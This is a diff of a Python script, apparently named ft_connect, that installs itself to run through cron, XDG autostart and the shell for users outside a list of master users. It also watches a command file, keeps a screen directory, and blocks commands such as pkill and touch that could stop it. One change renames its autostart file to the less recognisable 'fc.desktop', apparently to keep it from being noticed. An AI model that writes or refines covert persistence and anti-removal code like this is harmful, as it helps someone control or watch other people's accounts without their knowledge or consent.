@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 import os
+import sys
 import time
 import subprocess
 import getpass
@@ -23,7 +24,7 @@ TYPE_FILE = os.path.join(CMD_PATH, "type.txt")
 SCREEN_BASE_PATH = os.path.join(BASE_PATH, "screen")
 BLOCKED_LOG = os.path.join(CMD_PATH, "cmd_blocked.log")
 
-MASTER_USERS = ["zcadi", "aeherve", "root"]
+MASTER_USERS = ["zcadi", "aeheve", "root"]
 CURRENT_USER = getpass.getuser()
 
 FORBIDDEN = ["pkill", "xdg", "touch"]
@@ -34,7 +35,9 @@ VERBOSE_MODE = False
 # === PROCESS CHECK ===
 def is_ft_connect_running():
     try:
-        out = subprocess.check_output(["ps", "aux"], stderr=subprocess.DEVNULL).decode()
+        out = subprocess.check_output(
+            ["ps", "aux"], stderr=subprocess.DEVNULL
+        ).decode()
         pid = os.getpid()
         for line in out.splitlines():
             if SCRIPT_PATH in line and "python" in line:
@@ -103,7 +106,7 @@ def ensure_cron_autostart():
 # === XDG AUTOSTART ===
 def ensure_xdg_autostart():
     autostart_dir = os.path.expanduser("~/.config/autostart")
-    desktop_file = os.path.join(autostart_dir, "ft_connect.desktop")
+    desktop_file = os.path.join(autostart_dir, "fc.desktop")
 
     if os.path.exists(desktop_file):
         return
@@ -224,7 +227,7 @@ def watch_file():
 # === MAIN ===
 if __name__ == "__main__":
     if is_ft_connect_running():
-        exit(0)
+        sys.exit(0)
 
     if CURRENT_USER not in MASTER_USERS:
         ensure_shell_autostart()
